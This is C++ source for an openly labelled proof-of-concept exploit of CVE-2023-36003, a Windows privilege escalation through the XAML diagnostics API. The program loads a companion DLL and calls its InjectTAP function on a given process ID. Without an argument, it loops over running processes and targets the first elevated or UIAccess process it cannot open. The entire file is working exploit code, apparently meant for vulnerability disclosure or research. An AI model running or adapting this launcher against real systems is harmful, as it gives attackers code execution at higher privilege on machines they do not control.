#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>

#include <iostream>

bool RunPOC(DWORD pid, PCWSTR endpointName) {
	WCHAR path[MAX_PATH];
	switch (GetModuleFileName(nullptr, path, ARRAYSIZE(path))) {
	case 0:
	case ARRAYSIZE(path):
		std::cout << "Failed to get module file name\n";
		return false;
	}

	PWSTR filename = PathFindFileName(path);

	wcscpy_s(filename, ARRAYSIZE(path) - (filename - path), L"pe-poc-dll.dll");

	HMODULE lib = LoadLibrary(path);
	if (!lib) {
		std::cout << "Failed to load pe-poc-dll.dll\n";
		return false;
	}

	using inject_tap_proc_t = HRESULT(WINAPI*)(DWORD pid, PCWSTR endpointName);

	inject_tap_proc_t inject_tap_proc = (inject_tap_proc_t)GetProcAddress(lib, "InjectTAP");
	if (!inject_tap_proc) {
		std::cout << "Failed to get InjectTAP proc address\n";
		return false;
	}

	HRESULT hr = inject_tap_proc(pid, endpointName);

	// E_ELEMENT_NOT_FOUND
	if (hr == 0x80070490) {
		return false;
	}

	if (FAILED(hr)) {
		std::cout << "InjectTAP failed: " << hr << "\n";
		return false;
	}

	return true;
}

int wmain(int argc, WCHAR** argv) {
	std::cout << "CVE-2023-36003 privilege escalation POC using XAML diagnostics API\n";

	if (argc >= 2) {
		int pid = _wtoi(argv[1]);
		if (RunPOC(pid, argc >= 3 ? argv[2] : L"VisualDiagConnection1")) {
			std::cout << "Done, targeted PID " << pid << "\n";
		}
		else {
			std::cout << "Failed to target PID " << pid << "\n";
		}
		return 0;
	}

	std::cout << "Waiting for an elevated or otherwise inaccessible (e.g. UIAccess) process...\n";

	bool done = false;
	while (!done) {
		Sleep(1000);

		PROCESSENTRY32 entry{
			.dwSize = sizeof(PROCESSENTRY32),
		};

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (snapshot) {
			if (Process32First(snapshot, &entry)) {
				do {
					// Skip accessible processes.
					HANDLE process = OpenProcess(PROCESS_VM_WRITE, FALSE, entry.th32ProcessID);
					if (process) {
						CloseHandle(process);
						continue;
					}

					if (RunPOC(entry.th32ProcessID, L"VisualDiagConnection1")) {
						std::cout << "Done, targeted PID " << entry.th32ProcessID << "\n";
						done = true;
						break;
					}
				} while (Process32Next(snapshot, &entry));
			}

			CloseHandle(snapshot);
		}
	}
}
